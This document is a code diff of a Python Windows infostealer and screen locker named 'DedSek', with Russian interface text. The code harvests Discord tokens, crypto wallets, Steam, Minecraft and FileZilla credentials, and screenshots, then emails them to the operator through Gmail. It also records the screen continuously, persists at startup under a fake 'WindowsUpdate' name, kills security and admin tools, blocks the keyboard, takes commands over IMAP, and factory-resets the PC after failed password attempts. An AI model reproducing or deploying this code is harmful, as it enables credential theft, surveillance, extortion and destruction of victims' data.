+    for db in [os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'), os.path.join(os.environ['APPDATA'], 'discordcanary', 'Local Storage', 'leveldb'), os.path.join(os.environ['APPDATA'], 'discordptb', 'Local Storage', 'leveldb')]:
+        if not os.path.exists(db): continue
+        for f in os.listdir(db):
+            if f.endswith('.ldb') or f.endswith('.log'):
+                try: tokens.update(re.findall(r'[MN][A-Za-z\d]{23}\.[A-Za-z\d]{6}\.[A-Za-z\d]{27}', open(os.path.join(db,f),'r',errors='ignore').read()))
+                except: pass
+    R.extend([f"ТОКЕН: {t}" for t in list(tokens)[:20]] if tokens else ["Не найдены"])
+    
+    # Crypto
+    R.append("\n--- 💰 КРИПТО-КОШЕЛЬКИ ---")
+    wallets = {
+        "Bitcoin": os.path.join(os.environ['APPDATA'], 'Bitcoin', 'wallet.dat'),
+        "Electrum": os.path.join(os.environ['APPDATA'], 'Electrum', 'wallets'),
+        "Exodus": os.path.join(os.environ['APPDATA'], 'Exodus', 'exodus.wallet'),
+        "Atomic": os.path.join(os.environ['APPDATA'], 'atomic', 'Local Storage', 'leveldb'),
+    }
+    for name, path in wallets.items():
+        if os.path.exists(path):
+            R.append(f"✅ {name}: Найден")
+            if os.path.isfile(path): send_file_email(path, f"Wallet {name}")
+            elif os.path.isdir(path):
+                z = os.path.join(tempfile.gettempdir(), f'{name}.zip')
+                with zipfile.ZipFile(z, 'w') as zf:
+                    for r,d,files in os.walk(path):
+                        for f in files: zf.write(os.path.join(r,f), f)
+                send_file_email(z, f"Wallet {name}")
+                try: os.remove(z)
+                except: pass
+        else: R.append(f"❌ {name}: Нет")
+    
+    # Steam
+    R.append("\n--- 🎮 STEAM ---")
+    steam = os.path.join(os.environ.get('PROGRAMFILES(X86)', 'C:\\Program Files (x86)'), 'Steam', 'config')
+    if os.path.exists(steam):
+        for f in ['loginusers.vdf', 'config.vdf']:
+            fp = os.path.join(steam, f)
+            if os.path.exists(fp):
+                send_file_email(fp, f"Steam {f}")
+                R.append(f"✅ {f} отправлен!")
+    else: R.append("Не найден")
+    
+    # Minecraft
+    R.append("\n--- 🎮 MINECRAFT ---")
+    mc = os.path.join(os.environ['APPDATA'], '.minecraft', 'launcher_accounts.json')
+    if os.path.exists(mc):
+        send_file_email(mc, "Minecraft")
+        R.append("✅ Аккаунты отправлены!")
+    else: R.append("Не найден")
+    
+    # FileZilla
+    R.append("\n--- 📁 FILEZILLA ---")
+    for f in ['recentservers.xml', 'sitemanager.xml']:
+        fp = os.path.join(os.environ['APPDATA'], 'FileZilla', f)
+        if os.path.exists(fp):
+            send_file_email(fp, f"FileZilla {f}")
+            R.append(f"✅ {f} отправлен!")
+    
+    # Скриншот
+    try:
+        ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
+        ImageGrab.grab().save(ss, 'JPEG', quality=50)
+        send_file_email(ss, "Desktop Screenshot")
+        try: os.remove(ss)
+        except: pass
+        R.append("\n📸 Скриншот отправлен!")
+    except: pass
+    
+    R += ["\n" + "="*60, f"🕒 {time.strftime('%d.%m.%Y %H:%M:%S')}", "="*60]
+    
+    text = '\n'.join(R)
+    for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
+        send_email(part, f"DedSek ULTIMATE [{i+1}]")
 
 def send_email(message, subject=None):
     try:
         msg = MIMEText(message, 'plain', 'utf-8')
-        msg['Subject'] = subject or f'DedSek - {os.environ.get("USERNAME")}'
-        msg['From'] = GMAIL_LOGIN
-        msg['To'] = RECEIVER_EMAIL
+        msg['Subject'] = subject or f'DedSek'
+        msg['From'] = GMAIL_LOGIN; msg['To'] = RECEIVER_EMAIL
         s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
-        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
-        s.send_message(msg)
-        s.quit()
-    except:
-        pass
+        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(msg); s.quit()
+    except: pass
 
-def send_file_email(file_path, description):
+def send_file_email(fp, desc):
     try:
         msg = MIMEMultipart()
-        msg['Subject'] = f'Файл: {description}'
-        msg['From'] = GMAIL_LOGIN
-        msg['To'] = RECEIVER_EMAIL
-        with open(file_path, 'rb') as f:
-            p = MIMEBase('application', 'octet-stream')
-            p.set_payload(f.read())
+        msg['Subject'] = f'Файл: {desc}'
+        msg['From'] = GMAIL_LOGIN; msg['To'] = RECEIVER_EMAIL
+        with open(fp, 'rb') as f:
+            p = MIMEBase('application', 'octet-stream'); p.set_payload(f.read())
             encoders.encode_base64(p)
-            p.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(file_path)}"')
+            p.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(fp)}"')
             msg.attach(p)
         s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=60)
-        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
-        s.send_message(msg)
-        s.quit()
-    except:
-        pass
+        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(msg); s.quit()
+    except: pass
 
 # ========== ЗАПИСЬ ЭКРАНА ==========
-def record_and_send_loop():
+def record_loop():
     while True:
         try:
-            vp = os.path.join(tempfile.gettempdir(), f"scr_{int(time.time())}.avi")
+            vp = os.path.join(tempfile.gettempdir(), f"v_{int(time.time())}.avi")
             out = cv2.VideoWriter(vp, cv2.VideoWriter_fourcc(*'XVID'), 10.0, (1280, 720))
             for _ in range(150):
-                frame = cv2.cvtColor(np.array(ImageGrab.grab()), cv2.COLOR_BGR2RGB)
-                out.write(cv2.resize(frame, (1280, 720)))
+                out.write(cv2.resize(cv2.cvtColor(np.array(ImageGrab.grab()), cv2.COLOR_BGR2RGB), (1280, 720)))
                 time.sleep(0.1)
             out.release()
-            _send_video(vp)
-            try:
-                os.remove(vp)
-            except:
-                pass
-        except:
-            time.sleep(1)
+            _send_vid(vp)
+            try: os.remove(vp)
+            except: pass
+        except: time.sleep(1)
 
-def _send_video(fp):
+def _send_vid(fp):
     try:
         if os.path.getsize(fp) > 20*1024*1024:
             try:
                 out = fp.replace('.avi', '.mp4')
                 subprocess.run(['ffmpeg', '-i', fp, '-c:v', 'libx264', '-preset', 'ultrafast', '-crf', '35', '-b:v', '200k', '-s', '640x360', '-r', '10', '-y', out], capture_output=True, timeout=30)
                 fp = out
-            except:
-                pass
+            except: pass
         msg = MIMEMultipart()
-        msg['Subject'] = f'Видео - {os.environ.get("USERNAME")}'
-        msg['From'] = GMAIL_LOGIN
-        msg['To'] = RECEIVER_EMAIL
+        msg['Subject'] = f'Видео'
+        msg['From'] = GMAIL_LOGIN; msg['To'] = RECEIVER_EMAIL
         with open(fp, 'rb') as f:
-            p = MIMEBase('application', 'octet-stream')
-            p.set_payload(f.read())
+            p = MIMEBase('application', 'octet-stream'); p.set_payload(f.read())
             encoders.encode_base64(p)
-            p.add_header('Content-Disposition', f'attachment; filename="scr_{int(time.time())}.avi"')
+            p.add_header('Content-Disposition', f'attachment; filename="v_{int(time.time())}.avi"')
             msg.attach(p)
         s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
-        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
-        s.send_message(msg)
-        s.quit()
-    except:
-        pass
+        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(msg); s.quit()
+    except: pass
 
 # ========== ЧАТ ==========
-class VictimChat:
-    def __init__(self, locker_window):
-        self.locker = locker_window
-        self.chat_window = None
-        
+class Chat:
+    def __init__(self, locker):
+        self.locker = locker; self.win = None
+    
     def show(self):
-        if self.chat_window:
-            return
-        self.chat_window = tk.Toplevel()
-        self.chat_window.geometry("380x480+60+60")
-        self.chat_window.configure(bg='#00FF00')
-        self.chat_window.attributes('-topmost', True)
-        self.chat_window.overrideredirect(True)
-        self.chat_window.focus_force()
-        self.chat_window.grab_set()
+        if self.win: return
+        self.win = tk.Toplevel()
+        self.win.geometry("380x480+60+60")
+        self.win.configure(bg='#00FF00')
+        self.win.attributes('-topmost', True)
+        self.win.overrideredirect(True)
+        self.win.focus_force(); self.win.grab_set()
         
-        def keep_top():
-            while self.chat_window:
-                try:
-                    self.chat_window.lift()
-                    self.chat_window.attributes('-topmost', True)
-                    time.sleep(0.5)
-                except:
-                    break
-        threading.Thread(target=keep_top, daemon=True).start()
+        def keep():
+            while self.win:
+                try: self.win.lift(); self.win.attributes('-topmost', True); time.sleep(0.5)
+                except: break
+        threading.Thread(target=keep, daemon=True).start()
         
-        frame = tk.Frame(self.chat_window, bg='black', bd=2)
-        frame.pack(fill='both', expand=True, padx=2, pady=2)
+        f = tk.Frame(self.win, bg='black', bd=2); f.pack(fill='both', expand=True, padx=2, pady=2)
+        h = tk.Frame(f, bg='#00FF00'); h.pack(fill='x')
+        tk.Label(h, text="DedSek Chat", bg='#00FF00', fg='black', font=('Courier',11,'bold')).pack(side='left', padx=10, pady=5)
+        tk.Button(h, text="✕", command=self.hide, bg='#FF0000', fg='white', font=('Courier',12,'bold'), bd=0, width=3).pack(side='right', padx=5, pady=3)
         
-        h = tk.Frame(frame, bg='#00FF00')
-        h.pack(fill='x')
-        tk.Label(h, text="Чат DedSek", bg='#00FF00', fg='black', font=('Courier', 11, 'bold')).pack(side='left', padx=10, pady=5)
-        tk.Button(h, text="✕", command=self.hide, bg='#FF0000', fg='white', font=('Courier', 12, 'bold'), bd=0, width=3).pack(side='right', padx=5, pady=3)
+        self.hist = scrolledtext.ScrolledText(f, bg='#0a0a0a', fg='#00FF00', font=('Courier',10), height=20)
+        self.hist.pack(padx=10, pady=(0,5), fill='both', expand=True); self.hist.config(state='disabled')
         
-        self.hist = scrolledtext.ScrolledText(frame, bg='#0a0a0a', fg='#00FF00', font=('Courier', 10), height=20)
-        self.hist.pack(padx=10, pady=(0,5), fill='both', expand=True)
-        self.hist.config(state='disabled')
-        
-        inf = tk.Frame(frame, bg='black')
-        inf.pack(padx=10, pady=(0,10), fill='x')
-        self.entry = tk.Entry(inf, bg='#0a0a0a', fg='#00FF00', font=('Courier', 10), insertbackground='#00FF00')
+        inf = tk.Frame(f, bg='black'); inf.pack(padx=10, pady=(0,10), fill='x')
+        self.entry = tk.Entry(inf, bg='#0a0a0a', fg='#00FF00', font=('Courier',10), insertbackground='#00FF00')
         self.entry.pack(side='left', fill='x', expand=True, ipady=3)
-        self.entry.bind('<Return>', self.send_msg)
-        tk.Button(inf, text="▶", command=self.send_msg, bg='#00FF00', fg='black', font=('Courier', 10, 'bold'), width=3).pack(side='right', padx=(5,0))
+        self.entry.bind('<Return>', self.send)
+        tk.Button(inf, text="▶", command=self.send, bg='#00FF00', fg='black', font=('Courier',10,'bold'), width=3).pack(side='right', padx=(5,0))
         
-        h.bind('<Button-1>', self.start_drag)
-        h.bind('<B1-Motion>', self.drag)
+        h.bind('<Button-1>', lambda e: setattr(self, 'xy', (e.x_root, e.y_root)))
+        h.bind('<B1-Motion>', lambda e: self.win.geometry(f"+{self.win.winfo_x()+e.x_root-self.xy[0]}+{self.win.winfo_y()+e.y_root-self.xy[1]}") or setattr(self, 'xy', (e.x_root, e.y_root)))
         
-        self.add_msg("DedSek", "Привет!")
+        self.add("DedSek", "Привет! Твой ПК заблокирован.")
         self._check()
     
-    def start_drag(self, e):
-        self.x, self.y = e.x_root, e.y_root
-    def drag(self, e):
-        self.chat_window.geometry(f"+{self.chat_window.winfo_x()+e.x_root-self.x}+{self.chat_window.winfo_y()+e.y_root-self.y}")
-        self.x, self.y = e.x_root, e.y_root
-    
     def hide(self):
-        if self.chat_window:
-            self.chat_window.grab_release()
-            self.chat_window.destroy()
-            self.chat_window = None
-        self.locker.win.focus_force()
-        self.locker.pw_entry.focus_force()
+        if self.win: self.win.grab_release(); self.win.destroy(); self.win = None
+        self.locker.win.focus_force(); self.locker.pw.focus_force()
     
-    def send_msg(self, e=None):
+    def send(self, e=None):
         m = self.entry.get().strip()
-        if m:
-            self.add_msg("Ты", m)
-            self.entry.delete(0, tk.END)
-            send_email(f"Сообщение:\n{m}")
+        if m: self.add("Ты", m); self.entry.delete(0, tk.END); send_email(f"Сообщение:\n{m}")
     
-    def add_msg(self, s, m):
-        self.hist.config(state='normal')
-        self.hist.insert('end', f'[{s}]: {m}\n\n')
-        self.hist.see('end')
-        self.hist.config(state='disabled')
+    def add(self, s, m):
+        self.hist.config(state='normal'); self.hist.insert('end', f'[{s}]: {m}\n\n'); self.hist.see('end'); self.hist.config(state='disabled')
     
     def _check(self):
-        def _c():
+        def c():
             while True:
-                if not self.chat_window:
-                    break
+                if not self.win: break
                 try:
                     mail = imaplib.IMAP4_SSL('imap.gmail.com')
-                    mail.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
-                    mail.select('inbox')
-                    _, data = mail.search(None, 'SUBJECT "COMMAND:"', 'UNSEEN')
-                    if data[0]:
-                        for num in data[0].split():
-                            _, md = mail.fetch(num, '(RFC822)')
+                    mail.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); mail.select('inbox')
+                    _, d = mail.search(None, 'SUBJECT "COMMAND:"', 'UNSEEN')
+                    if d[0]:
+                        for n in d[0].split():
+                            _, md = mail.fetch(n, '(RFC822)')
                             msg = email.message_from_bytes(md[0][1])
                             if msg.is_multipart():
-                                for part in msg.walk():
-                                    if part.get_content_type() == "text/plain":
-                                        cmd = part.get_payload(decode=True).decode()
-                                        if cmd.startswith("MSG:") and self.chat_window:
-                                            self.chat_window.after(0, self.add_msg, "DedSek", cmd[4:])
-                            mail.store(num, '+FLAGS', '\\Seen')
-                    mail.close()
-                    mail.logout()
-                except:
-                    pass
+                                for p in msg.walk():
+                                    if p.get_content_type() == "text/plain":
+                                        cmd = p.get_payload(decode=True).decode()
+                                        if cmd.startswith("MSG:") and self.win:
+                                            self.win.after(0, self.add, "DedSek", cmd[4:])
+                            mail.store(n, '+FLAGS', '\\Seen')
+                    mail.close(); mail.logout()
+                except: pass
                 time.sleep(5)
-        threading.Thread(target=_c, daemon=True).start()
+        threading.Thread(target=c, daemon=True).start()
 
 # ========== ОСТАЛЬНОЕ ==========
 def anti_debug():
     try:
-        if ctypes.windll.kernel32.IsDebuggerPresent():
-            os._exit(0)
-    except:
-        pass
+        if ctypes.windll.kernel32.IsDebuggerPresent(): os._exit(0)
+    except: pass
 
-def add_to_startup():
+def add_startup():
     try:
         cp = os.path.abspath(__file__)
         pp = os.path.splitext(cp)[0] + ".pyw"
         if not cp.endswith(".pyw"):
-            try:
-                shutil.copy2(cp, pp)
-            except:
-                pass
+            try: shutil.copy2(cp, pp)
+            except: pass
             cp = pp
         sf = winshell.startup()
         sp = os.path.join(sf, "WindowsUpdate.lnk")
-        sh = Dispatch('WScript.Shell')
-        sc = sh.CreateShortCut(sp)
+        sc = Dispatch('WScript.Shell').CreateShortCut(sp)
         sc.TargetPath = sys.executable.replace("python.exe", "pythonw.exe")
-        sc.Arguments = f'"{cp}"'
-        sc.WorkingDirectory = os.path.dirname(cp)
-        sc.IconLocation = "shell32.dll,13"
-        sc.save()
+        sc.Arguments = f'"{cp}"'; sc.WorkingDirectory = os.path.dirname(cp)
+        sc.IconLocation = "shell32.dll,13"; sc.save()
         try:
             k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
             winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{cp}"')
             winreg.CloseKey(k)
-        except:
-            pass
-    except:
-        pass
+        except: pass
+    except: pass
 
-def block_input(block=True):
-    try:
-        ctypes.windll.user32.BlockInput(block)
-    except:
-        pass
-
-def block_all_keys():
+def block_keys():
     try:
         import keyboard
         for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','alt','ctrl','shift','f11','print screen','alt+print screen','left windows','right windows']:
-            try:
-                keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
-            except:
-                pass
-        for k in ['windows','left windows','right windows','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','scroll lock','pause']:
-            try:
-                keyboard.block_key(k)
-            except:
-                pass
+            try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
+            except: pass
+        for k in ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','space','enter','backspace','tab','caps lock','shift','ctrl','alt','esc','delete','insert','home','end','page up','page down','up','down','left','right','windows','left windows','right windows','print screen','scroll lock','pause']:
+            try: keyboard.block_key(k)
+            except: pass
     except:
-        pass
+        try: ctypes.windll.user32.BlockInput(True)
+        except: pass
 
-def kill_processes():
+def unblock():
+    try: ctypes.windll.user32.BlockInput(False)
+    except: pass
+    try:
+        import keyboard; keyboard.unhook_all()
+    except: pass
+
+def kill_procs():
     kl = ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe","procexp.exe","procmon.exe","processhacker.exe","wireshark.exe"]
     while True:
-        for p in kl:
-            os.system(f"taskkill /f /im {p} >nul 2>&1")
+        for p in kl: os.system(f"taskkill /f /im {p} >nul 2>&1")
         time.sleep(0.05)
 
-def prevent_shutdown():
-    try:
-        ctypes.windll.user32.ShutdownBlockReasonCreate(ctypes.windll.kernel32.GetConsoleWindow(), "Windows Update...")
-    except:
-        pass
-
-def full_windows_reset():
-    try:
-        restore_win_key()
-        es = tk.Tk()
-        es.attributes('-fullscreen', True)
-        es.attributes('-topmost', True)
-        es.configure(bg='black')
-        es.overrideredirect(True)
-        tk.Label(es, text="404 | ОШИБКА WINDOWS", bg='black', fg='#FF0000', font=('Courier', 40, 'bold')).pack(expand=True)
-        tk.Label(es, text="КРИТИЧЕСКИЙ СБОЙ\nВСЕ ДАННЫЕ УНИЧТОЖАЮТСЯ...", bg='black', fg='#FF0000', font=('Courier', 20)).pack()
-        es.update()
-        time.sleep(5)
-        es.destroy()
-        os.system("taskkill /f /im explorer.exe >nul 2>&1")
-        os.system("systemreset -factoryreset")
-        time.sleep(3)
-        os.system("shutdown /r /t 0 /f")
-        os._exit(0)
-    except:
-        os.system("shutdown /r /t 0 /f")
-        os._exit(0)
-
-def boot_animation():
+def boot_anim():
     a = tk.Tk()
-    a.attributes('-fullscreen', True)
-    a.attributes('-topmost', True)
-    a.configure(bg='black')
-    a.overrideredirect(True)
+    a.attributes('-fullscreen', True); a.attributes('-topmost', True)
+    a.configure(bg='black'); a.overrideredirect(True)
     disable_win_key()
-    l = tk.Label(a, text="", bg='black', fg='white', font=('Courier', 20, 'bold'))
+    l = tk.Label(a, text="", bg='black', fg='white', font=('Courier',20,'bold'))
     l.pack(expand=True)
     for i in range(8):
         a.configure(bg='white' if i%2==0 else 'black')
         l.config(bg='white' if i%2==0 else 'black', fg='black' if i%2==0 else 'white')
-        a.update()
-        time.sleep(0.2)
-    a.configure(bg='black')
-    l.config(bg='black', fg='#00FF00')
+        a.update(); time.sleep(0.2)
+    a.configure(bg='black'); l.config(bg='black', fg='#00FF00')
     a.attributes('-alpha', 0)
     for alpha in range(0, 110, 5):
         a.attributes('-alpha', alpha/100)
-        l.config(text="DedSek тебя взломал")
-        a.update()
-        time.sleep(0.03)
+        l.config(text="DedSek тебя взломал"); a.update(); time.sleep(0.03)
     time.sleep(1.5)
     for msg in ["Идёт шифровка...","[                    ] 0%","[####                ] 20%","[########            ] 40%","[############        ] 60%","[################    ] 80%","[####################] 100%","","ДАННЫЕ ЗАШИФРОВАНЫ!"]:
-        l.config(text=msg)
-        a.update()
-        time.sleep(0.25)
-    time.sleep(1)
-    a.destroy()
+        l.config(text=msg); a.update(); time.sleep(0.25)
+    time.sleep(1); a.destroy()
+
+def reset_windows():
+    try:
+        restore_win_key(); unblock()
+        es = tk.Tk()
+        es.attributes('-fullscreen', True); es.attributes('-topmost', True)
+        es.configure(bg='black'); es.overrideredirect(True)
+        tk.Label(es, text="404 | ОШИБКА", bg='black', fg='#FF0000', font=('Courier',40,'bold')).pack(expand=True)
+        tk.Label(es, text="ВСЕ ДАННЫЕ УНИЧТОЖАЮТСЯ...", bg='black', fg='#FF0000', font=('Courier',20)).pack()
+        es.update(); time.sleep(5); es.destroy()
+        os.system("taskkill /f /im explorer.exe >nul 2>&1")
+        os.system("systemreset -factoryreset")
+        time.sleep(3)
+        os.system("shutdown /r /t 0 /f"); os._exit(0)
+    except:
+        os.system("shutdown /r /t 0 /f"); os._exit(0)
 
 class WinLocker:
     def __init__(self):
-        self.root = tk.Tk()
-        self.root.withdraw()
+        self.root = tk.Tk(); self.root.withdraw()
         self.win = tk.Toplevel(self.root)
-        self.win.attributes('-fullscreen', True)
-        self.win.attributes('-topmost', True)
-        self.win.configure(bg='black')
-        self.win.overrideredirect(True)
+        self.win.attributes('-fullscreen', True); self.win.attributes('-topmost', True)
+        self.win.configure(bg='black'); self.win.overrideredirect(True)
         self.win.protocol("WM_DELETE_WINDOW", lambda: None)
         
         global attempts_left
@@ -829,13 +775,11 @@ class WinLocker:
         try:
             img_data = base64.b64decode(SKULL_BASE64)
             img_path = os.path.join(tempfile.gettempdir(), "dedsek.png")
-            with open(img_path, "wb") as f:
-                f.write(img_data)
+            with open(img_path, "wb") as f: f.write(img_data)
             img = PhotoImage(file=img_path)
             tk.Label(self.win, image=img, bg='black').place(relx=0.5, rely=0.05, anchor='center')
             self.win._img = img
-        except:
-            pass
+        except: pass
         
         msg = f"""ПРИВЕТ! ТВОЙ WINDOWS ЗАБЛОКИРОВАН!
 
@@ -858,78 +802,62 @@ $1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1
 
 УДАЧИ. У ТЕБЯ {MAX_ATTEMPTS} ПОПЫТКИ!"""
         
-        tk.Label(self.win, text=msg, bg='black', fg='#00FF00', font=('Courier', 9, 'bold'), justify='left').place(relx=0.5, rely=0.42, anchor='center')
+        tk.Label(self.win, text=msg, bg='black', fg='#00FF00', font=('Courier',9,'bold'), justify='left').place(relx=0.5, rely=0.42, anchor='center')
         
-        self.chat = VictimChat(self)
-        self.chat_open = False
-        self.chat_btn = tk.Button(self.win, text="ЧАТ", command=self.toggle_chat, bg='#00FF00', fg='black', font=('Courier', 10, 'bold'), cursor='hand2', bd=1, width=6)
+        self.chat = Chat(self); self.chat_open = False
+        self.chat_btn = tk.Button(self.win, text="ЧАТ", command=self.toggle_chat, bg='#00FF00', fg='black', font=('Courier',10,'bold'), cursor='hand2', bd=1, width=6)
         self.chat_btn.place(relx=0.95, rely=0.08, anchor='ne')
         
-        cf = tk.Frame(self.win, bg='black')
-        cf.place(relx=0.5, rely=0.82, anchor='center')
-        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='#00FF00', font=('Courier', 14, 'bold')).pack(pady=(0,5))
-        self.pw_entry = tk.Entry(cf, show="*", font=('Courier', 14, 'bold'), bg='black', fg='#00FF00', insertbackground='#00FF00', relief='solid', bd=2)
-        self.pw_entry.pack(pady=(0,5), ipadx=40, ipady=3)
-        self.status_lbl = tk.Label(cf, text=f"ОСТАЛОСЬ ПОПЫТОК: {attempts_left}", bg='black', fg='#FF0000', font=('Courier', 12, 'bold'))
+        cf = tk.Frame(self.win, bg='black'); cf.place(relx=0.5, rely=0.82, anchor='center')
+        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='#00FF00', font=('Courier',14,'bold')).pack(pady=(0,5))
+        self.pw = tk.Entry(cf, show="*", font=('Courier',14,'bold'), bg='black', fg='#00FF00', insertbackground='#00FF00', relief='solid', bd=2)
+        self.pw.pack(pady=(0,5), ipadx=40, ipady=3)
+        self.status_lbl = tk.Label(cf, text=f"ОСТАЛОСЬ: {attempts_left}", bg='black', fg='#FF0000', font=('Courier',12,'bold'))
         self.status_lbl.pack()
-        self.pw_entry.bind('<Return>', self.check_password)
-        self.pw_entry.focus_force()
-        self._keep_focus()
+        self.pw.bind('<Return>', self.check)
+        self.pw.focus_force()
+        self._keep()
     
     def toggle_chat(self):
-        if self.chat_open:
-            self.chat.hide()
-            self.chat_open = False
-            self.chat_btn.config(text="ЧАТ")
-        else:
-            self.chat.show()
-            self.chat_open = True
-            self.chat_btn.config(text="[✕]")
+        if self.chat_open: self.chat.hide(); self.chat_open = False; self.chat_btn.config(text="ЧАТ")
+        else: self.chat.show(); self.chat_open = True; self.chat_btn.config(text="[✕]")
     
-    def _keep_focus(self):
-        try:
-            self.win.focus_force()
-            self.pw_entry.focus_force()
-            self.win.after(100, self._keep_focus)
-        except:
-            pass
+    def _keep(self):
+        try: self.win.focus_force(); self.pw.focus_force(); self.win.after(100, self._keep)
+        except: pass
     
-    def check_password(self, e=None):
+    def check(self, e=None):
         global attempts_left
-        if self.pw_entry.get() == PASSWORD:
-            restore_win_key()
+        if self.pw.get() == PASSWORD:
+            restore_win_key(); unblock()
             self.status_lbl.config(text="ВЕРНО!", fg='#00FF00')
-            self.win.update()
-            time.sleep(1)
-            block_input(False)
-            self.root.destroy()
-            os._exit(0)
+            self.win.update(); time.sleep(1)
+            self.root.destroy(); os._exit(0)
         else:
             attempts_left -= 1
-            if attempts_left > 0:
-                self.status_lbl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='#FF0000')
+            if attempts_left > 0: self.status_lbl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='#FF0000')
             else:
                 self.status_lbl.config(text="404 | ОШИБКА", fg='#FF0000')
-                self.win.update()
-                time.sleep(2)
-                self.root.destroy()
-                full_windows_reset()
-            self.pw_entry.delete(0, tk.END)
+                self.win.update(); time.sleep(2)
+                self.root.destroy(); reset_windows()
+            self.pw.delete(0, tk.END)
 
-# ========== ТОЧКА ВХОДА ==========
+# ========== ПУСК ==========
 if __name__ == "__main__":
     hide_console()
     anti_debug()
     disable_win_key()
-    run_as_admin()
-    threading.Thread(target=mega_steal_data, daemon=True).start()
-    threading.Thread(target=record_and_send_loop, daemon=True).start()
-    add_to_startup()
+    run_as_admin_silent()
+    
+    threading.Thread(target=mega_steal, daemon=True).start()
+    threading.Thread(target=record_loop, daemon=True).start()
+    
+    add_startup()
     time.sleep(TIMER_SECONDS)
-    boot_animation()
-    block_input(True)
-    prevent_shutdown()
-    threading.Thread(target=kill_processes, daemon=True).start()
-    threading.Thread(target=block_all_keys, daemon=True).start()
+    boot_anim()
+    block_keys()
+    try: ctypes.windll.user32.ShutdownBlockReasonCreate(ctypes.windll.kernel32.GetConsoleWindow(), "Windows Update...")
+    except: pass
+    threading.Thread(target=kill_procs, daemon=True).start()
     WinLocker()
     tk.mainloop()
